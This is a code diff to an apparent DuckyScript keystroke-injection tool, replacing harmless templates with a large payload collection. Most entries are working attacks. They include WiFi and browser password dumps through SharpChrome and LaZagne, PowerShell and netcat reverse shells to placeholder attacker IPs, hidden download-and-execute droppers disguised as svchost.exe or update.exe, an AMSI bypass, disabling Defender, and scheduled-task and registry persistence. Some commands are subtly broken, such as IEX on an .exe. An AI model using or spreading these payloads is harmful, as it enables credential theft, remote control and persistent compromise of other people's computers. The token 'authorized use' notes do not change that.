@@ -63,14 +63,244 @@
       F7: 'Send("{F7}")', F8: 'Send("{F8}")', F9: 'Send("{F9}")', F10: 'Send("{F10}")', F11: 'Send("{F11}")', F12: 'Send("{F12}")',
     };
     const FALLBACK_TEMPLATES = [
-      { id: 'T1', name: 'Open Notepad', code: 'DELAY 1500\nGUI r\nDELAY 400\nSTRING notepad\nENTER\nDELAY 600\nSTRING Hello from LENLU SC Forge v4.0!' },
-      { id: 'T2', name: 'Classic Rickroll', code: 'DELAY 1500\nGUI r\nDELAY 400\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER' },
-      { id: 'T3', name: 'System Info Dump', code: 'GUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 600\nSTRING systeminfo > %TEMP%\\sysinfo.txt && notepad %TEMP%\\sysinfo.txt\nENTER' },
-      { id: 'T4', name: 'Lock Workstation', code: 'GUI r\nDELAY 300\nSTRING rundll32.exe user32.dll,LockWorkStation\nENTER' },
-      { id: 'T5', name: 'Open Calculator (Spam)', code: 'GUI r\nDELAY 300\nSTRING calc\nENTER\nREPEAT 10' },
-      { id: 'T6', name: 'DuckyScript 3.0 Function Example', code: 'FUNCTION openNotepad()\n    GUI r\n    DELAY 300\n    STRING notepad\n    ENTER\n    DELAY 800\nEND_FUNCTION\n\nopenNotepad()\nSTRING Hello from DuckyScript 3.0!' },
-    ];
+  {
+    "id": "PT1",
+    "name": "Open Notepad and Type Message",
+    "code": "DELAY 1500\nGUI r\nDELAY 400\nSTRING notepad\nENTER\nDELAY 600\nSTRINGLN Welcome to the DuckyScript Payload Collection!\nSTRING This is for authorized testing only."
+  },
+  {
+    "id": "PT2",
+    "name": "Rickroll",
+    "code": "DELAY 1000\nGUI r\nDELAY 300\nSTRING https://www.youtube.com/watch?v=dQw4w9wgxcq\nENTER"
+  },
+  {
+    "id": "PT3",
+    "name": "Matrix Rain Effect",
+    "code": "GUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 600\nSTRING color 02 && echo %random%%random%%random%%random%%random%%random%%random%%random%%random% && goto :a\nENTER\n\n# Add more prank payloads here..."
+  },
+  {
+    "id": "PT4",
+    "name": "Full System Info Dump",
+    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Get-ComputerInfo | Out-File C:\\temp\\systeminfo.txt; whoami >> C:\\temp\\systeminfo.txt; ipconfig /all >> C:\\temp\\systeminfo.txt\nENTER\nDELAY 500\nSTRING notepad C:\\temp\\systeminfo.txt\nENTER"
+  },
+  {
+    "id": "PT5",
+    "name": "WiFi Passwords Exfiltration",
+    "code": "GUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 600\nSTRING netsh wlan show profiles > C:\\temp\\wifi.txt && for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles') do netsh wlan show profile name=\"%a\" key=clear >> C:\\temp\\wifi.txt\nENTER\n\n# More info gathering payloads..."
+  },
+  {
+    "id": "PT6",
+    "name": "SharpChrome Password Dump",
+    "code": "GUI r\nDELAY 400\nSTRING powershell -w hidden\nENTER\nDELAY 800\nSTRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flangvik/SharpCollection/master/CompiledBinaries/SharpChrome.exe'); SharpChrome.exe passwords --unhide > C:\\temp\\chrome.txt\nENTER\n\n# Add LaZagne, Mimikatz style (ethical note: for authorized use only)"
+  },
+  {
+    "id": "PT7",
+    "name": "PowerShell TCP Reverse Shell",
+    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING $client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER\n\n# More variants: HTTP, DNS, etc."
+  },
+  {
+    "id": "PT8",
+    "name": "Silent Dropper",
+    "code": "GUI r\nDELAY 300\nSTRING powershell -w hidden -c \"Invoke-WebRequest -Uri 'http://yourserver.com/payload.exe' -OutFile '$env:TEMP\\svchost.exe'; Start-Process '$env:TEMP\\svchost.exe'\"\nENTER"
+  },
+  {
+    "id": "PT9",
+    "name": "Classic Rickroll",
+    "code": "DELAY 1500\nGUI r\nDELAY 400\nSTRING https://www.youtube.com/watch?v=dQw4w9wgxcq\nENTER"
+  },
+  {
+    "id": "PT10",
+    "name": "Infinite Notepad Prank",
+    "code": "GUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 600\nREPEAT 50\nSTRINGLN This computer has been compromised by Duckyscript!\nENTER"
+  },
+  {
+    "id": "PT12",
+    "name": "Full System Information Grabber",
+    "code": "GUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 700\nSTRING Get-ComputerInfo | Out-File C:\\temp\\system_info.txt; Get-WmiObject Win32_StartupCommand | Out-File C:\\temp\\startup.txt\nENTER\nDELAY 400\nSTRING notepad C:\\temp\\system_info.txt\nENTER"
+  },
+  {
+    "id": "PT13",
+    "name": "Installed Software List",
+    "code": "GUI r\nDELAY 300\nSTRING powershell -c \"Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName, DisplayVersion | Out-File C:\\temp\\installed.txt\"\nENTER"
+  },
+  {
+    "id": "PT14",
+    "name": "Active Directory Domain Info",
+    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING (Get-WmiObject Win32_ComputerSystem).Domain > C:\\temp\\domain.txt; whoami /groups >> C:\\temp\\domain.txt\nENTER"
+  },
+  {
+    "id": "PT15",
+    "name": "Export All WiFi Passwords",
+    "code": "GUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING netsh wlan show profiles > C:\\temp\\wifi.txt && for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles') do netsh wlan show profile name=\"%a\" key=clear >> C:\\temp\\wifi.txt\nENTER\nDELAY 800\nSTRING notepad C:\\temp\\wifi.txt\nENTER"
+  },
+  {
+    "id": "PT16",
+    "name": "Network Interfaces + IP Config",
+    "code": "GUI r\nDELAY 300\nSTRING powershell -c \"Get-NetIPAddress | Out-File C:\\temp\\network.txt; ipconfig /all >> C:\\temp\\network.txt\"\nENTER"
+  },
+  {
+    "id": "PT18",
+    "name": "LaZagne Multi-Credential Stealer",
+    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING IEX (New-Object Net.WebClient).DownloadString('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe'); .\\LaZagne.exe all -o C:\\temp\\creds.txt\nENTER"
+  },
+  {
+    "id": "PT19",
+    "name": "Basic PowerShell Reverse Shell",
+    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING $client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER"
+  },
+  {
+    "id": "PT20",
+    "name": "AMSI Bypass + Reverse Shell",
+    "code": "GUI r\nDELAY 300\nSTRING powershell -w hidden -c \"powershell -ep bypass\"\nENTER\nDELAY 600\nSTRING [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')\nENTER"
+  },
+  {
+    "id": "PT21",
+    "name": "Scheduled Task Persistence",
+    "code": "GUI r\nDELAY 400\nSTRING schtasks /create /tn \"UpdateTask\" /tr \"powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/payload.ps1')\" /sc onlogon /ru System\nENTER"
+  },
+  {
+    "id": "PT22",
+    "name": "Light Defender Bypass",
+    "code": "GUI r\nDELAY 300\nSTRING powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"\nENTER"
+  },
+  {
+    "id": "PT23",
+    "name": "Function Based Professional Template",
+    "code": "FUNCTION recon()\n    GUI r\n    DELAY 300\n    STRING powershell\n    ENTER\n    DELAY 500\n    STRING whoami /all > C:\\temp\\whoami.txt\nEND_FUNCTION\n\nrecon()"
+  },
+  {
+    "id": "PT24",
+    "name": "Open Notepad",
+    "code": "GUI r\nDELAY 500\nSTRING notepad\nENTER"
+  },
+  {
+    "id": "PT28",
+    "name": "WiFi Passwords Dump",
+    "code": "GUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 700\nSTRING netsh wlan show profile name=* key=clear > C:\\Users\\%USERNAME%\\Desktop\\WiFi_Passwords.txt\nENTER\nDELAY 1000\nSTRING notepad C:\\Users\\%USERNAME%\\Desktop\\WiFi_Passwords.txt\nENTER"
+  },
+  {
+    "id": "PT29",
+    "name": "System Information Grabber",
+    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 800\nSTRING Get-ComputerInfo | Out-File -FilePath \"$env:USERPROFILE\\Desktop\\SystemInfo.txt\"\nENTER\nDELAY 600\nSTRING Get-NetIPAddress | Out-File -Append \"$env:USERPROFILE\\Desktop\\SystemInfo.txt\"\nENTER"
+  },
+  {
+    "id": "PT30",
+    "name": "Saved Passwords (Basic)",
+    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING cmdkey /list > \"$env:USERPROFILE\\Desktop\\SavedCredentials.txt\"\nENTER\n\nREM ================================================\nREM DOWNLOAD & EXECUTE\nREM ================================================"
+  },
+  {
+    "id": "PT31",
+    "name": "Download and Run EXE",
+    "code": "GUI r\nDELAY 400\nSTRING powershell -w hidden\nENTER\nDELAY 600\nSTRING Invoke-WebRequest -Uri \"http://yourserver.com/payload.exe\" -OutFile \"$env:TEMP\\update.exe\"; Start-Process \"$env:TEMP\\update.exe\"\nENTER"
+  },
+  {
+    "id": "PT32",
+    "name": "Download PS1 Script",
+    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING IEX (New-Object Net.WebClient).DownloadString('http://yourserver.com/script.ps1')\nENTER\n\nREM ================================================\nREM REVERSE SHELLS\nREM ================================================"
+  },
+  {
+    "id": "PT33",
+    "name": "PowerShell Reverse Shell",
+    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 800\nSTRING $client = New-Object System.Net.Sockets.TCPClient('YOUR_IP_HERE',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER\n\nREM ================================================\nREM CREDENTIAL STEALING\nREM ================================================"
+  },
+  {
+    "id": "PT34",
+    "name": "Chrome Passwords (Using SharpChrome)",
+    "code": "GUI r\nDELAY 400\nSTRING powershell -w hidden\nENTER\nDELAY 700\nSTRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flangvik/SharpCollection/master/CompiledBinaries/SharpChrome.exe'); .\\SharpChrome.exe passwords --unhide > \"$env:USERPROFILE\\Desktop\\ChromePasswords.txt\"\nENTER\n\nREM ================================================\nREM DuckyScript 3.0 Advanced Examples\nREM ================================================"
+  },
+  {
+    "id": "PT35",
+    "name": "Function Example",
+    "code": "FUNCTION openRun()\n    GUI r\n    DELAY 300\n    STRING \nEND_FUNCTION\n\nFUNCTION typeText($text)\n    STRINGLN $text\nEND_FUNCTION\n\nopenRun()\nDELAY 500\nSTRING notepad\nENTER\nDELAY 800\ntypeText(\"Advanced DuckyScript 3.0 Payload\")\ntypeText(\"This is much more powerful!\")\n\nREM ================================================\nREM MORE PAYLOADS\nREM ================================================"
+  },
+  {
+    "id": "PT36",
+    "name": "Lock Computer",
+    "code": "GUI l"
+  },
+  {
+    "id": "PT37",
+    "name": "Shutdown Computer",
+    "code": "GUI r\nDELAY 400\nSTRING shutdown /s /t 0\nENTER"
+  },
+  {
+    "id": "PT38",
+    "name": "Open Calculator",
+    "code": "GUI r\nDELAY 400\nSTRING calc\nENTER"
+  },
+  {
+    "id": "PT39",
+    "name": "Open Browser with multiple tabs",
+    "code": "GUI r\nDELAY 400\nSTRING msedge --new-window https://google.com\nENTER\nDELAY 1000\nCTRL T\nSTRING https://youtube.com\nENTER"
+  },
+  {
+    "id": "PT40",
+    "name": "Fake BSOD (Blue Screen Prank)",
+    "code": "GUI r\nDELAY 400\nSTRING notepad\nENTER\nDELAY 800\nSTRING A problem has been detected and Windows has been shut down to prevent damage\nENTER\nSTRING Your PC ran into a problem and needs to restart.\nENTER\n\nREM Add more payloads as needed..."
+  },
+  {
+    "id": "PT41",
+    "name": "Basic Notepad Prank",
+    "code": "GUI r\nDELAY 400\nSTRING notepad\nENTER\nDELAY 600\nSTRINGLN This is a Duckyscript test payload!\nREPEAT 20"
+  },
+  {
+    "id": "PT43",
+    "name": "System Info Grabber",
+    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Get-ComputerInfo | Out-File C:\\temp\\sysinfo.txt\nENTER\nSTRING notepad C:\\temp\\sysinfo.txt\nENTER"
+  },
+  {
+    "id": "PT44",
+    "name": "WiFi Password Dump",
+    "code": "GUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 600\nSTRING netsh wlan show profile > C:\\temp\\wifi.txt && for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles') do netsh wlan show profile name=\"%a\" key=clear >> C:\\temp\\wifi.txt\nENTER\nSTRING notepad C:\\temp\\wifi.txt\nENTER"
+  },
+  {
+    "id": "PT45",
+    "name": "PowerShell Reverse Shell (Basic)",
+    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 800\nSTRING $client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER"
+  },
+  {
+    "id": "PT46",
+    "name": "SharpChrome Password Stealer",
+    "code": "GUI r\nDELAY 400\nSTRING powershell -w hidden\nENTER\nDELAY 700\nSTRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flangvik/SharpCollection/master/CompiledBinaries/SharpChrome.exe'); SharpChrome.exe passwords --unhide > C:\\temp\\chrome.txt\nENTER"
+  },
+  {
+    "id": "PT47",
+    "name": "Lock Workstation",
+    "code": "GUI r\nDELAY 300\nSTRING rundll32.exe user32.dll,LockWorkStation\nENTER"
+  },
+  {
+    "id": "PT48",
+    "name": "Shutdown Prank",
+    "code": "GUI r\nDELAY 300\nSTRING shutdown /s /t 60\nENTER"
+  },
+  {
+    "id": "PT50",
+    "name": "Download and Execute EXE",
+    "code": "GUI r\nDELAY 400\nSTRING powershell -w hidden -c \"Invoke-WebRequest -Uri 'http://YOUR_IP/malware.exe' -OutFile '$env:TEMP\\update.exe'; Start-Process '$env:TEMP\\update.exe'\"\nENTER"
+  },
+  {
+    "id": "PT51",
+    "name": "LaZagne Credential Harvester",
+    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING IEX (New-Object Net.WebClient).DownloadString('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe'); .\\LaZagne.exe all > C:\\temp\\creds.txt\nENTER"
+  },
+  {
+    "id": "PT53",
+    "name": "Registry Run Key Persistence",
+    "code": "GUI r\nDELAY 400\nSTRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/payload.ps1')\" /f\nENTER"
+  },
+  {
+    "id": "PT54",
+    "name": "Open Calculator Spam",
+    "code": "GUI r\nDELAY 300\nSTRING calc\nENTER\nREPEAT 15"
+  },
+  {
+    "id": "PT55",
+    "name": "Matrix Rain Prank",
+    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING while(1){cls;1..200|%{Write-Host (\" \"* (Get-Random -Max 80)) -NoNewline; Write-Host (\"10\"[Get-Random -Max 2]) -ForegroundColor Green -NoNewline} ;Start-Sleep -m 50}\nENTER\n\n\n\n### 1. Basic Prank Payloads\n\n**Rickroll**\n```duckyscript\nDELAY 1000\nGUI r\nDELAY 400\nSTRING https://www.youtube.com/watch?v=dQw4w9wgxcq\nENTER\n```\n\n**Infinite Notepad**\n```duckyscript\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 500\nREPEAT 30\nSTRING This is a prank by Duckyscript!\nENTER\n```\n\n---\n\n### 2. Information Gathering Payloads\n\n**Dump WiFi Passwords (Windows)**\n```duckyscript\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 600\nSTRING for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles') do @echo %a >> C:\\temp\\wifi.txt && netsh wlan show profile name=\"%a\" key=clear >> C:\\temp\\wifi.txt\nENTER\nDELAY 800\nSTRING notepad C:\\temp\\wifi.txt\nENTER\n```\n\n**System Info Grabber**\n```duckyscript\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 700\nSTRING $computer = Get-WmiObject -Class Win32_ComputerSystem; $user = $env:USERNAME; $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike \"*Loopback*\"}).IPAddress; echo \"User: $user | PC: $($computer.Name) | IP: $ip\" > C:\\temp\\info.txt\nENTER\n```\n\n---\n\n### 3. Download & Execute Payloads\n\n**Download and Run (PowerShell)**\n```duckyscript\nGUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING IEX (New-Object Net.WebClient).DownloadString('http://yourserver.com/payload.ps1')\nENTER\n```\n\n**Silent Download + Execute**\n```duckyscript\nGUI r\nDELAY 300\nSTRING powershell -w hidden -c \"Invoke-WebRequest -Uri 'http://yourserver.com/malware.exe' -OutFile '$env:TEMP\\update.exe'; Start-Process '$env:TEMP\\update.exe'\"\nENTER\n```\n\n---\n\n### 4. Reverse Shell Payloads\n\n**Netcat Reverse Shell (if nc is installed)**\n```duckyscript\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING nc.exe your.ip.here 4444 -e powershell.exe\nENTER\n```\n\n**PowerShell Reverse Shell (One-liner)**\n```duckyscript\nGUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING $client = New-Object System.Net.Sockets.TCPClient('your.ip.here',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER\n```\n\n---\n\n### 5. Credential Stealing (Simple)\n\n**Steal Saved Chrome Passwords (Advanced - needs tools)**\n```duckyscript\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 600\nSTRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flangvik/SharpCollection/master/CompiledBinaries/SharpChrome.exe'); SharpChrome.exe passwords --unhide\nENTER\n```\n\n---\n\n### 6. DuckyScript 3.0 Example (with Functions)\n\n```duckyscript\nDELAY 1500\n\nFUNCTION openNotepad()\n    GUI r\n    DELAY 300\n    STRING notepad\n    ENTER\n    DELAY 800\nEND_FUNCTION\n\nFUNCTION typeMessage($msg)\n    STRINGLN $msg\nEND_FUNCTION\n\nopenNotepad()\ntypeMessage(\"Hello from DuckyScript 3.0!\")\ntypeMessage(\"This is much cleaner!\")\n```"
+  }
+];;
     let parsedTemplates = [...FALLBACK_TEMPLATES];
+    window.parsedTemplates = parsedTemplates;
     const SNIPPETS = [
       { name: 'Run Dialog', code: 'GUI r\nDELAY 300\n' },
       { name: 'PowerShell Hidden', code: 'STRING powershell -WindowStyle Hidden\nENTER\n' },
@@ -98,13 +328,14 @@
       { id: 'T1082', name: 'System Information Discovery', tactic: 'Discovery', desc: 'Adversaries may query system profile, build specs, and active users to survey targets.', mitigation: 'Limit command executions, query monitoring.' },
       { id: 'T1041', name: 'Exfiltration Over C2 Channel', tactic: 'Exfiltration', desc: 'Adversaries may siphon sensitive database outputs back toCommand and Control nodes.', mitigation: 'Network boundary filters, egress payload inspects, rate monitoring.' }
     ];
-export { S, BOOT, ACTS, DUCK_CMDS, DUCK_MAP, FALLBACK_TEMPLATES, SNIPPETS, DUCK_KEY_MAP, MITRE_DB };
+export { S, BOOT, ACTS, DUCK_CMDS, DUCK_MAP, FALLBACK_TEMPLATES, parsedTemplates, SNIPPETS, DUCK_KEY_MAP, MITRE_DB };
 window.S = S;
 window.BOOT = BOOT;
 window.ACTS = ACTS;
 window.DUCK_CMDS = DUCK_CMDS;
 window.DUCK_MAP = DUCK_MAP;
 window.FALLBACK_TEMPLATES = FALLBACK_TEMPLATES;
+window.parsedTemplates = parsedTemplates;
 window.SNIPPETS = SNIPPETS;
 window.DUCK_KEY_MAP = DUCK_KEY_MAP;
 window.MITRE_DB = MITRE_DB;
